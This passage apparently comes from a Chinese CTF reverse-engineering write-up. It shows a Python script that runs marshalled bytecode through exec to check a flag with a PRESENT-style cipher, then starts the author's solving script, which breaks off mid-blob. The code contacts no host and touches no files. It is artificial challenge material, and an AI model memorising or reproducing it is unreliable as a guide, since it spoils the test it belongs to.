+<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> marshal</span><br><span class="line"><span class="comment"># import pickle</span></span><br><span class="line"></span><br><span class="line">code = <span class="string">b&#x27;c\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00@\x00\x00\x00@\x00\x00\x00s\xe2\x00\x00\x00d\x00d\x01d\x02d\x03d\x04d\x05d\x06d\x07d\x08d\td\nd\x0bd\x0cd\rd\x0ed\x0fg\x10Z\x00d\x10d\x11\x84\x00e\x01d\x12\x83\x01D\x00\x83\x01Z\x02d\x05d\x12d\x13d\x14d\x0ed\x15d\x16d\x17d\x0fd\x18d\x19d\x1ad\x08d\x1bd\x1cd\x1dd\x0cd\x1ed\x1fd d\x01d!d&quot;d#d\x02d$d%d&amp;d\rd\&#x27;d(d)d\x0bd*d+d,d\x04d-d.d/d\x06d0d1d2d\x03d3d4d5d\x00d6d7d8d\x07d9d:d;d\td&lt;d=d&gt;d\nd?d@dAg@Z\x03dBd\x11\x84\x00e\x01dC\x83\x01D\x00\x83\x01Z\x04e\x05\xa0\x06dD\xa1\x01Z\x07e\x08e\x07\x83\x01\x01\x00dES\x00)F\xe9\x0c\x00\x00\x00\xe9\x05\x00\x00\x00\xe9\x06\x00\x00\x00\xe9\x0b\x00\x00\x00\xe9\t\x00\x00\x00\xe9\x00\x00\x00\x00\xe9\n\x00\x00\x00\xe9\r\x00\x00\x00\xe9\x03\x00\x00\x00\xe9\x0e\x00\x00\x00\xe9\x0f\x00\x00\x00\xe9\x08\x00\x00\x00\xe9\x04\x00\x00\x00\xe9\x07\x00\x00\x00\xe9\x01\x00\x00\x00\xe9\x02\x00\x00\x00c\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x02\x00\x00\x00\x05\x00\x00\x00C\x00\x00\x00s\x16\x00\x00\x00g\x00|\x00]\x0e&#125;\x01t\x00\xa0\x01|\x01\xa1\x01\x91\x02q\x04S\x00\xa9\x00)\x02\xda\x04Sbox\xda\x05index\xa9\x02\xda\x02.0\xda\x01xr\x10\x00\x00\x00r\x10\x00\x00\x00\xda\x00\xda\n&lt;listcomp&gt;\x04\x00\x00\x00s\x04\x00\x00\x00\x06\x00\x02\x00r\x17\x00\x00\x00\xe9\x10\x00\x00\x00\xe9 \x00\x00\x00\xe90\x00\x00\x00\xe9\x11\x00\x00\x00\xe9!\x00\x00\x00\xe91\x00\x00\x00\xe9\x12\x00\x00\x00\xe9&quot;\x00\x00\x00\xe92\x00\x00\x00\xe9\x13\x00\x00\x00\xe9#\x00\x00\x00\xe93\x00\x00\x00\xe9\x14\x00\x00\x00\xe9$\x00\x00\x00\xe94\x00\x00\x00\xe9\x15\x00\x00\x00\xe9%\x00\x00\x00\xe95\x00\x00\x00\xe9\x16\x00\x00\x00\xe9&amp;\x00\x00\x00\xe96\x00\x00\x00\xe9\x17\x00\x00\x00\xe9\&#x27;\x00\x00\x00\xe97\x00\x00\x00\xe9\x18\x00\x00\x00\xe9(\x00\x00\x00\xe98\x00\x00\x00\xe9\x19\x00\x00\x00\xe9)\x00\x00\x00\xe99\x00\x00\x00\xe9\x1a\x00\x00\x00\xe9*\x00\x00\x00\xe9:\x00\x00\x00\xe9\x1b\x00\x00\x00\xe9+\x00\x00\x00\xe9;\x00\x00\x00\xe9\x1c\x00\x00\x00\xe9,\x00\x00\x00\xe9&lt;\x00\x00\x00\xe9\x1d\x00\x00\x00\xe9-\x00\x00\x00\xe9=\x00\x00\x00\xe9\x1e\x00\x00\x00\xe9.\x00\x00\x00\xe9&gt;\x00\x00\x00\xe9\x1f\x00\x00\x00\xe9/\x00\x00\x00\xe9?\x00\x00\x00c\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x02\x00\x00\x00\x05\x00\x00\x00C\x00\x00\x00s\x16\x00\x00\x00g\x00|\x00]\x0e&#125;\x01t\x00\xa0\x01|\x01\xa1\x01\x91\x02q\x04S\x00r\x10\x00\x00\x00)\x02\xda\x04PBoxr\x12\x00\x00\x00r\x13\x00\x00\x00r\x10\x00\x00\x00r\x10\x00\x00\x00r\x16\x00\x00\x00r\x17\x00\x00\x00\t\x00\x00\x00s\x04\x00\x00\x00\x06\x00\x02\x00\xe9@\x00\x00\x00s#\n\x00\x00c\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x03\x00\x00\x00@\x00\x00\x00s\x1e\x00\x00\x00d\x00d\x01\x84\x00Z\x00e\x01\xa0\x02d\x02\xa1\x01Z\x03e\x04e\x03\x83\x01\x01\x00d\x03S\x00)\x04c\x02\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x02\x00\x00\x00\x02\x00\x00\x00C\x00\x00\x00s\x08\x00\x00\x00|\x00|\x01A\x00S\x00)\x01N\xa9\x00)\x02\xda\x05stateZ\x08roundkeyr\x00\x00\x00\x00r\x00\x00\x00\x00\xda\x00\xda\x0baddRoundKey\x02\x00\x00\x00s\x02\x00\x00\x00\x00\x01r\x03\x00\x00\x00s,\t\x00\x00c\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x03\x00\x00\x00@\x00\x00\x00s\x1e\x00\x00\x00d\x00d\x01\x84\x00Z\x00e\x01\xa0\x02d\x02\xa1\x01Z\x03e\x04e\x03\x83\x01\x01\x00d\x03S\x00)\x04c\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x03\x00\x00\x00\x06\x00\x00\x00C\x00\x00\x00s6\x00\x00\x00d\x01&#125;\x01t\x00d\x02\x83\x01D\x00]$&#125;\x02|\x01t\x01|\x00|\x02d\x03\x14\x00?\x00d\x04@\x00\x19\x00|\x02d\x03\x14\x00&gt;\x007\x00&#125;\x01q\x0c|\x01S\x00)\x05N\xe9\x00\x00\x00\x00\xe9\x10\x00\x00\x00\xe9\x04\x00\x00\x00\xe9\x0f\x00\x00\x00)\x02\xda\x05rangeZ\x04Sbox)\x03\xda\x05state\xda\x06output\xda\x01i\xa9\x00r\x08\x00\x00\x00\xda\x00\xda\tsBoxLayer\x02\x00\x00\x00s\x08\x00\x00\x00\x00\x01\x04\x01\x0c\x01&quot;\x01r\n\x00\x00\x00s\xe4\x07\x00\x00c\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x03\x00\x00\x00@\x00\x00\x00s\x1e\x00\x00\x00d\x00d\x01\x84\x00Z\x00e\x01\xa0\x02d\x02\xa1\x01Z\x03e\x04e\x03\x83\x01\x01\x00d\x03S\x00)\x04c\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x03\x00\x00\x00\x05\x00\x00\x00C\x00\x00\x00s.\x00\x00\x00d\x01&#125;\x01t\x00d\x02\x83\x01D\x00]\x1c&#125;\x02|\x01|\x00|\x02?\x00d\x03@\x00t\x01|\x02\x19\x00&gt;\x007\x00&#125;\x01q\x0c|\x01S\x00)\x04N\xe9\x00\x00\x00\x00\xe9@\x00\x00\x00\xe9\x01\x00\x00\x00)\x02\xda\x05rangeZ\x04PBox)\x03\xda\x05state\xda\x06output\xda\x01i\xa9\x00r\x07\x00\x00\x00\xda\x00\xda\x06pLayer\x02\x00\x00\x00s\x08\x00\x00\x00\x00\x01\x04\x01\x0c\x01\x1a\x01r\t\x00\x00\x00s\xac\x06\x00\x00c\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x03\x00\x00\x00@\x00\x00\x00s\x1e\x00\x00\x00d\x00d\x01\x84\x00Z\x00e\x01\xa0\x02d\x02\xa1\x01Z\x03e\x04e\x03\x83\x01\x01\x00d\x03S\x00)\x04c\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00\x04\x00\x00\x00\x03\x00\x00\x00s\x1a\x00\x00\x00t\x00\x87\x00f\x01d\x01d\x02\x84\x08t\x01d\x03\x83\x01D\x00\x83\x01\x83\x01S\x00)\x04Nc\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x02\x00\x00\x00\x05\x00\x00\x00\x13\x00\x00\x00s \x00\x00\x00g\x00|\x00]\x18&#125;\x01t\x00\x88\x00|\x01\x19\x00\x83\x01d\x00|\x01\x14\x00&gt;\x00\x91\x02q\x04S\x00)\x01\xe9\x08\x00\x00\x00)\x01\xda\x03ord)\x02\xda\x02.0\xda\x01c\xa9\x01\xda\x01i\xa9\x00\xda\x00\xda\n&lt;listcomp&gt;\x03\x00\x00\x00s\x04\x00\x00\x00\x06\x00\x02\x00z!string2number.&lt;locals&gt;.&lt;listcomp&gt;r\x00\x00\x00\x00)\x02\xda\x03sum\xda\x05ranger\x04\x00\x00\x00r\x06\x00\x00\x00r\x04\x00\x00\x00r\x07\x00\x00\x00\xda\rstring2number\x02\x00\x00\x00s\x02\x00\x00\x00\x00\x01r\x0b\x00\x00\x00s\x01\x05\x00\x00c\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x03\x00\x00\x00@\x00\x00\x00s\x1e\x00\x00\x00d\x00d\x01\x84\x00Z\x00e\x01\xa0\x02d\x02\xa1\x01Z\x03e\x04e\x03\x83\x01\x01\x00d\x03S\x00)\x04c\x02\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x04\x00\x00\x00\x05\x00\x00\x00C\x00\x00\x00st\x00\x00\x00g\x00&#125;\x02t\x00d\x01|\x01d\x01\x17\x00d\x01\x83\x03D\x00]Z&#125;\x03|\x02\xa0\x01|\x00d\x02?\x00\xa1\x01\x01\x00|\x00d\x03@\x00d\x04&gt;\x00|\x00d\x05?\x00\x17\x00&#125;\x00t\x02|\x00d\x06?\x00\x19\x00d\x06&gt;\x00|\x00d\x07d\x06\x13\x00d\x01\x18\x00@\x00\x17\x00&#125;\x00|\x00|\x03d\x08&gt;\x00|\x00d\x05?\x00A\x00N\x00&#125;\x00q\x14|\x02S\x00)\tN\xe9\x01\x00\x00\x00\xe9\x10\x00\x00\x00i\xff\xff\x07\x00\xe9=\x00\x00\x00\xe9\x13\x00\x00\x00\xe9L\x00\x00\x00\xe9\x02\x00\x00\x00\xe9\x0f\x00\x00\x00)\x03\xda\x05range\xda\x06appendZ\x04Sbox)\x04\xda\x03key\xda\x06roundsZ\troundkeys\xda\x01i\xa9\x00r\x0c\x00\x00\x00\xda\x00\xda\x13generateRoundkeys80\x02\x00\x00\x00s\x0e\x00\x00\x00\x00\x01\x04\x01\x14\x01\x0e\x01\x14\x01 \x01\x16\x01r\x0e\x00\x00\x00sF\x03\x00\x00c\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x06\x00\x00\x00@\x00\x00\x00s\xa6\x00\x00\x00d\x00d\x01\x84\x00Z\x00e\x01d\x02\x83\x01Z\x02e\x03e\x02\x83\x01d\x03k\x03r,e\x04d\x04\x83\x01\x01\x00e\x05d\x05\x83\x01\x01\x00e\x02d\x06d\x07\x85\x02\x19\x00e\x02d\x07d\x08\x85\x02\x19\x00e\x02d\x08d\t\x85\x02\x19\x00e\x02d\td\x03\x85\x02\x19\x00g\x04Z\x06d\nd\x0bd\x0cd\rg\x04Z\x07e\x00e\x06\x83\x01Z\x08e\td\x0e\x83\x01D\x00]$Z\ne\x07e\n\x19\x00e\x08e\n\x19\x00k\x03rte\x04d\x04\x83\x01\x01\x00e\x05d\x05\x83\x01\x01\x00qte\x04d\x0f\x83\x01\x01\x00d\x06S\x00)\x10c\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x08\x00\x00\x00\x06\x00\x00\x00C\x00\x00\x00sp\x00\x00\x00d\x01&#125;\x01t\x00d\x02|\x01\x83\x02&#125;\x02g\x00&#125;\x03|\x00D\x00]T&#125;\x04t\x01|\x04\x83\x01&#125;\x05t\x02|\x01d\x03\x18\x00\x83\x01D\x00]&quot;&#125;\x06t\x03|\x05|\x02|\x06\x19\x00\x83\x02&#125;\x05t\x04|\x05\x83\x01&#125;\x05t\x05|\x05\x83\x01&#125;\x05q.t\x03|\x05|\x02d\x04\x19\x00\x83\x02&#125;\x07|\x03\xa0\x06|\x07\xa1\x01\x01\x00q\x16|\x03S\x00)\x05N\xe9 \x00\x00\x00l\x06\x00\x00\x00! 20\\X\xa8 1!\x02\x00\xe9\x01\x00\x00\x00\xe9\xff\xff\xff\xff)\x07Z\x13generateRoundkeys80Z\rstring2number\xda\x05rangeZ\x0baddRoundKeyZ\tsBoxLayerZ\x06pLayer\xda\x06append)\x08\xda\x06blocks\xda\x06roundsZ\troundkeysZ\x03outZ\x05block\xda\x05state\xda\x01iZ\x06cipher\xa9\x00r\t\x00\x00\x00\xda\x00\xda\x07encrypt\x02\x00\x00\x00s\x18\x00\x00\x00\x00\x01\x04\x01\n\x01\x04\x01\x08\x01\x08\x01\x10\x01\x0e\x01\x08\x01\n\x01\x0e\x01\x0c\x01r\x0b\x00\x00\x00z\x12pls input ur flag:r\x00\x00\x00\x00z\x0bwrong flag!\xe9\x00\x00\x00\x00N\xe9\x08\x00\x00\x00\xe9\x10\x00\x00\x00\xe9\x18\x00\x00\x00l\x04\x00\x00\x00\x9e\x1faH\xc4\x13d\rl\x05\x00\x00\x00b]t:\x94Z\x15\x18\x0e\x00l\x04\x00\x00\x000ek95\x04\xb2&quot;l\x05\x00\x00\x00\x88o\xeddY\x13\xb1L\x01\x00\xe9\x04\x00\x00\x00z\x08Correct!)\x0br\x0b\x00\x00\x00\xda\x05inputZ\x03inp\xda\x03len\xda\x05print\xda\x04exitr\x05\x00\x00\x00Z\x04cmpsZ\nout_blocksr\x03\x00\x00\x00r\x08\x00\x00\x00r\t\x00\x00\x00r\t\x00\x00\x00r\t\x00\x00\x00r\n\x00\x00\x00\xda\x08&lt;module&gt;\x02\x00\x00\x00s\x18\x00\x00\x00\x08\x0e\x08\x01\x0c\x01\x08\x01\x08\x01,\x01\x0c\x01\x08\x01\x0c\x01\x10\x01\x08\x01\n\x01N)\x05r\x0e\x00\x00\x00\xda\x07marshal\xda\x05loads\xda\x02co\xda\x04execr\x0c\x00\x00\x00r\x0c\x00\x00\x00r\x0c\x00\x00\x00r\r\x00\x00\x00\xda\x08&lt;module&gt;\x02\x00\x00\x00s\x04\x00\x00\x00\x08\t\n\x01N)\x05r\x0b\x00\x00\x00\xda\x07marshal\xda\x05loads\xda\x02co\xda\x04execr\x06\x00\x00\x00r\x06\x00\x00\x00r\x06\x00\x00\x00r\x07\x00\x00\x00\xda\x08&lt;module&gt;\x02\x00\x00\x00s\x04\x00\x00\x00\x08\x03\n\x01N)\x05r\t\x00\x00\x00\xda\x07marshal\xda\x05loads\xda\x02co\xda\x04execr\x07\x00\x00\x00r\x07\x00\x00\x00r\x07\x00\x00\x00r\x08\x00\x00\x00\xda\x08&lt;module&gt;\x02\x00\x00\x00s\x04\x00\x00\x00\x08\x06\n\x01N)\x05r\n\x00\x00\x00\xda\x07marshal\xda\x05loads\xda\x02co\xda\x04execr\x08\x00\x00\x00r\x08\x00\x00\x00r\x08\x00\x00\x00r\t\x00\x00\x00\xda\x08&lt;module&gt;\x02\x00\x00\x00s\x04\x00\x00\x00\x08\x06\n\x01N)\x05r\x03\x00\x00\x00\xda\x07marshal\xda\x05loads\xda\x02co\xda\x04execr\x00\x00\x00\x00r\x00\x00\x00\x00r\x00\x00\x00\x00r\x02\x00\x00\x00\xda\x08&lt;module&gt;\x02\x00\x00\x00s\x04\x00\x00\x00\x08\x03\n\x01N)\tr\x11\x00\x00\x00\xda\x05rangeZ\x08Sbox_invrH\x00\x00\x00Z\x08PBox_inv\xda\x07marshal\xda\x05loads\xda\x02co\xda\x04execr\x10\x00\x00\x00r\x10\x00\x00\x00r\x10\x00\x00\x00r\x16\x00\x00\x00\xda\x08&lt;module&gt;\x03\x00\x00\x00sl\x00\x00\x00$\x01\x12\x01 \x01\x02\x00\x02\x00\x02\x00\x02\x00\x02\x00\x02\x00\x02\x00\x02\x00\x02\x00\x02\x00\x02\x00\x02\x00\x02\x00\x02\x00\x02\x00\x02\x01\x02\x00\x02\x00\x02\x00\x02\x00\x02\x00\x02\x00\x02\x00\x02\x00\x02\x00\x02\x00\x02\x00\x02\x00\x02\x00\x02\x00\x02\x00\x02\x01\x02\x00\x02\x00\x02\x00\x02\x00\x02\x00\x02\x00\x02\x00\x02\x00\x02\x00\x02\x00\x02\x00\x02\x00\x02\x00\x02\x00\x02\x00\x02\xfd\x04\x04\x12\x02\n\x01&#x27;</span></span><br><span class="line"></span><br><span class="line">l = marshal.loads(code)</span><br><span class="line"><span class="built_in">exec</span>(l)</span><br></pre></td></tr></table></figure></div>
+
+<hr>
+<blockquote>
+<p>之前没接触过，猜测是运行结果啥的都在<code>exec</code>函数里面，使用的<code>dis.dis</code>不太像，后来又使用了umcompyle6，写出来的脚本跑出来啥也不是。</p>
+<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">##原来的exp脚本</span></span><br><span class="line"><span class="keyword">import</span> marshal</span><br><span class="line"><span class="keyword">import</span> uncompyle6</span><br><span class="line">code = <span class="string">b&#x27;c\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00@\x00\x00\x00@\x00\x00\x00s\xe2\x00\x00\x00d\x00d\x01d\x02d\x03d\x04d\x05d\x06d\x07d\x08d\td\nd\x0bd\x0cd\rd\x0ed\x0fg\x10Z\x00d\x10d\x11\x84\x00e\x01d\x12\x83\x01D\x00\x83\x01Z\x02d\x05d\x12d\x13d\x14d\x0ed\x15d\x16d\x17d\x0fd\x18d\x19d\x1ad\x08d\x1bd\x1cd\x1dd\x0cd\x1ed\x1fd d\x01d!d&quot;d#d\x02d$d%d&amp;d\rd\&#x27;d(d)d\x0bd*d+d,d\x04d-d.d/d\x06d0d1d2d\x03d3d4d5d\x00d6d7d8d\x07d9d:d;d\td&lt;d=d&gt;d\nd?d@dAg@Z\x03dBd\x11\x84\x00e\x01dC\x83\x01D\x00\x83\x01Z\x04e\x05\xa0\x06dD\xa1\x01Z\x07e\x08e\x07\x83\x01\x01\x00dES\x00)F\xe9\x0c\x00\x00\x00\xe9\x05\x00\x00\x00\xe9\x06\x00\x00\x00\xe9\x0b\x00\x00\x00\xe9\t\x00\x00\x00\xe9\x00\x00\x00\x00\xe9\n\x00\x00\x00\xe9\r\x00\x00\x00\xe9\x03\x00\x00\x00\xe9\x0e\x00\x00\x00\xe9\x0f\x00\x00\x00\xe9\x08\x00\x00\x00\xe9\x04\x00\x00\x00\xe9\x07\x00\x00\x00\xe9\x01\x00\x00\x00\xe9\x02\x00\x00\x00c\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x02\x00\x00\x00\x05\x00\x00\x00C\x00\x00\x00s\x16\x00\x00\x00g\x00|\x00]\x0e&#125;\x01t\x00\xa0\x01|\x01\xa1\x01\x91\x02q\x04S\x00\xa9\x00)\x02\xda\x04Sbox\xda\x05index\xa9\x02\xda\x02.0\xda\x01xr\x10\x00\x00\x00r\x10\x00\x00\x00\xda\x00\xda\n&lt;listcomp&gt;\x04\x00\x00\x00s\x04\x00\x00\x00\x06\x00\x02\x00r\x17\x00\x00\x00\xe9\x10\x00\x00\x00\xe9 \x00\x00\x00\xe90\x00\x00\x00\xe9\x11\x00\x00\x00\xe9!\x00\x00\x00\xe91\x00\x00\x00\xe9\x12\x00\x00\x00\xe9&quot;\x00\x00\x00\xe92\x00\x00\x00\xe9\x13\x00\x00\x00\xe9#\x00\x00\x00\xe93\x00\x00\x00\xe9\x14\x00\x00\x00\xe9$\x00\x00\x00\xe94\x00\x00\x00\xe9\x15\x00\x00\x00\xe9%\x00\x00\x00\xe95\x00\x00\x00\xe9\x16\x00\x00\x00\xe9&amp;\x00\x00\x00\xe96\x00\x00\x00\xe9\x17\x00\x00\x00\xe9\&#x27;\x00\x00\x00\xe97\x00\x00\x00\xe9\x18\x00\x00\x00\xe9(\x00\x00\x00\xe98\x00\x00\x00\xe9\x19\x00\x00\x00\xe9)\x00\x00\x00\xe99\x00\x00\x00\xe9\x1a\x00\x00\x00\xe9*\x00\x00\x00\xe9:\x00\x00\x00\xe9\x1b\x00\x00\x00\xe9+\x00\x00\x00\xe9;\x00\x00\x00\xe9\x1c\x00\x00\x00\xe9,\x00\x00\x00\xe9&lt;\x00\x00\x00\xe9\x1d\x00\x00\x00\xe9-\x00\x00\x00\xe9=\x00\x00\x00\xe9\x1e\x00\x00\x00\xe9.\x00\x00\x00\xe9&gt;\x00\x00\x00\xe9\x1f\x00\x00\x00\xe9/\x00\x00\x00\xe9?\x00\x00\x00c\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x02\x00\x00\x00\x05\x00\x00\x00C\x00\x00\x00s\x16\x00\x00\x00g\x00|\x00]\x0e&#125;\x01t\x00\xa0\x01|\x01\xa1\x01\x91\x02q\x04S\x00r\x10\x00\x00\x00)\x02\xda\x04PBoxr\x12\x00\x00\x00r\x13\x00\x00\x00r\x10\x00\x00\x00r\x10\x00\x00\x00r\x16\x00\x00\x00r\x17\x00\x00\x00\t\x00\x00\x00s\x04\x00\x00\x00\x06\x00\x02\x00\xe9@\x00\x00\x00s#\n\x00\x00c\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x03\x00\x00\x00@\x00\x00\x00s\x1e\x00\x00\x00d\x00d\x01\x84\x00Z\x00e\x01\xa0\x02d\x02\xa1\x01Z\x03e\x04e\x03\x83\x01\x01\x00d\x03S\x00)\x04c\x02\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x02\x00\x00\x00\x02\x00\x00\x00C\x00\x00\x00s\x08\x00\x00\x00|\x00|\x01A\x00S\x00)\x01N\xa9\x00)\x02\xda\x05stateZ\x08roundkeyr\x00\x00\x00\x00r\x00\x00\x00\x00\xda\x00\xda\x0baddRoundKey\x02\x00\x00\x00s\x02\x00\x00\x00\x00\x01r\x03\x00\x00\x00s,\t\x00\x00c\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x03\x00\x00\x00@\x00\x00\x00s\x1e\x00\x00\x00d\x00d\x01\x84\x00Z\x00e\x01\xa0\x02d\x02\xa1\x01Z\x03e\x04e\x03\x83\x01\x01\x00d\x03S\x00)\x04c\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x03\x00\x00\x00\x06\x00\x00\x00C\x00\x00\x00s6\x00\x00\x00d\x01&#125;\x01t\x00d\x02\x83\x01D\x00]$&#125;\x02|\x01t\x01|\x00|\x02d\x03\x14\x00?\x00d\x04@\x00\x19\x00|\x02d\x03\x14\x00&gt;\x007\x00&#125;\x01q\x0c|\x01S\x00)\x05N\xe9\x00\x00\x00\x00\xe9\x10\x00\x00\x00\xe9\x04\x00\x00\x00\xe9\x0f\x00\x00\x00)\x02\xda\x05rangeZ\x04Sbox)\x03\xda\x05state\xda\x06output\xda\x01i\xa9\x00r\x08\x00\x00\x00\xda\x00\xda\tsBoxLayer\x02\x00\x00\x00s\x08\x00\x00\x00\x00\x01\x04\x01\x0c\x01&quot;\x01r\n\x00\x00\x00s\xe4\x07\x00\x00c\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x03\x00\x00\x00@\x00\x00\x00s\x1e\x00\x00\x00d\x00d\x01\x84\x00Z\x00e\x01\xa0\x02d\x02\xa1\x01Z\x03e\x04e\x03\x83\x01\x01\x00d\x03S\x00)\x04c\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x03\x00\x00\x00\x05\x00\x00\x00C\x00\x00\x00s.\x00\x00\x00d\x01&#125;\x01t\x00d\x02\x83\x01D\x00]\x1c&#125;\x02|\x01|\x00|\x02?\x00d\x03@\x00t\x01|\x02\x19\x00&gt;\x007\x00&#125;\x01q\x0c|\x01S\x00)\x04N\xe9\x00\x00\x00\x00\xe9@\x00\x00\x00\xe9\x01\x00\x00\x00)\x02\xda\x05rangeZ\x04PBox)\x03\xda\x05state\xda\x06output\xda\x01i\xa9\x00r\x07\x00\x00\x00\xda\x00\xda\x06pLayer\x02\x00\x00\x00s\x08\x00\x00\x00\x00\x01\x04\x01\x0c\x01\x1a\x01r\t\x00\x00\x00s\xac\x06\x00\x00c\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x03\x00\x00\x00@\x00\x00\x00s\x1e\x00\x00\x00d\x00d\x01\x84\x00Z\x00e\x01\xa0\x02d\x02\xa1\x01Z\x03e\x04e\x03\x83\x01\x01\x00d\x03S\x00)\x04c\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00\x04\x00\x00\x00\x03\x00\x00\x00s\x1a\x00\x00\x00t\x00\x87\x00f\x01d\x01d\x02\x84\x08t\x01d\x03\x83\x01D\x00\x83\x01\x83\x01S\x00)\x04Nc\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x02\x00\x00\x00\x05\x00\x00\x00\x13\x00\x00\x00s \x00\x00\x00g\x00|\x00]\x18&#125;\x01t\x00\x88\x00|\x01\x19\x00\x83\x01d\x00|\x01\x14\x00&gt;\x00\x91\x02q\x04S\x00)\x01\xe9\x08\x00\x00\x00)\x01\xda\x03ord)\x02\xda\x02.0\xda\x01c\xa9\x01\xda\x01i\xa9\x00\xda\x00\xda\n&lt;listcomp&gt;\x03\x00\x00\x00s\x04\x00\x00\x00\x06\x00\x02\x00z!string2number.&lt;locals&gt;.&lt;listcomp&gt;r\x00\x00\x00\x00)\x02\xda\x03sum\xda\x05ranger\x04\x00\x00\x00r\x06\x00\x00\x00r\x04\x00\x00\x00r\x07\x00\x00\x00\xda\rstring2number\x02\x00\x00\x00s\x02\x00\x00\x00\x00\x01r\x0b\x00\x00\x00s\x01\x05\x00\x00c\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x03\x00\x00\x00@\x00\x00\x00s\x1e\x00\x00\x00d\x00d\x01\x84\x00Z\x00e\x01\xa0\x02d\x02\xa1\x01Z\x03e\x04e\x03\x83\x01\x01\x00d\x03S\x00)\x04c\x02\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x04\x00\x00\x00\x05\x00\x00\x00C\x00\x00\x00st\x00\x00\x00g\x00&#125;\x02t\x00d\x01|\x01d\x01\x17\x00d\x01\x83\x03D\x00]Z&#125;\x03|\x02\xa0\x01|\x00d\x02?\x00\xa1\x01\x01\x00|\x00d\x03@\x00d\x04&gt;\x00|\x00d\x05?\x00\x17\x00&#125;\x00t\x02|\x00d\x06?\x00\x19\x00d\x06&gt;\x00|\x00d\x07d\x06\x13\x00d\x01\x18\x00@\x00\x17\x00&#125;\x00|\x00|\x03d\x08&gt;\x00|\x00d\x05?\x00A\x00N\x00&#125;\x00q\x14|\x02S\x00)\tN\xe9\x01\x00\x00\x00\xe9\x10\x00\x00\x00i\xff\xff\x07\x00\xe9=\x00\x00\x00\xe9\x13\x00\x00\x00\xe9L\x00\x00\x00\xe9\x02\x00\x00\x00\xe9\x0f\x00\x00\x00)\x03\xda\x05range\xda\x06appendZ\x04Sbox)\x04\xda\x03key\xda\x06roundsZ\troundkeys\xda\x01i\xa9\x00r\x0c\x00\x00\x00\xda\x00\xda\x13generateRoundkeys80\x02\x00\x00\x00s\x0e\x00\x00\x00\x00\x01\x04\x01\x14\x01\x0e\x01\x14\x01 \x01\x16\x01r\x0e\x00\x00\x00sF\x03\x00\x00c\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x06\x00\x00\x00@\x00\x00\x00s\xa6\x00\x00\x00d\x00d\x01\x84\x00Z\x00e\x01d\x02\x83\x01Z\x02e\x03e\x02\x83\x01d\x03k\x03r,e\x04d\x04\x83\x01\x01\x00e\x05d\x05\x83\x01\x01\x00e\x02d\x06d\x07\x85\x02\x19\x00e\x02d\x07d\x08\x85\x02\x19\x00e\x02d\x08d\t\x85\x02\x19\x00e\x02d\td\x03\x85\x02\x19\x00g\x04Z\x06d\nd\x0bd\x0cd\rg\x04Z\x07e\x00e\x06\x83\x01Z\x08e\td\x0e\x83\x01D\x00]$Z\ne\x07e\n\x19\x00e\x08e\n\x19\x00k\x03rte\x04d\x04\x83\x01\x01\x00e\x05d\x05\x83\x01\x01\x00qte\x04d\x0f\x83\x01\x01\x00d\x06S\x00)\x10c\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x08\x00\x00\x00\x06\x00\x00\x00C\x00\x00\x00sp\x00\x00\x00d\x01&#125;\x01t\x00d\x02|\x01\x83\x02&#125;\x02g\x00&#125;\x03|\x00D\x00]T&#125;\x04t\x01|\x04\x83\x01&#125;\x05t\x02|\x01d\x03\x18\x00\x83\x01D\x00]&quot;&#125;\x06t\x03|\x05|\x02|\x06\x19\x00\x83\x02&#125;\x05t\x04|\x05\x83\x01&#125;\x05t\x05|\x05\x83\x01&#125;\x05q.t\x03|\x05|\x02d\x04\x19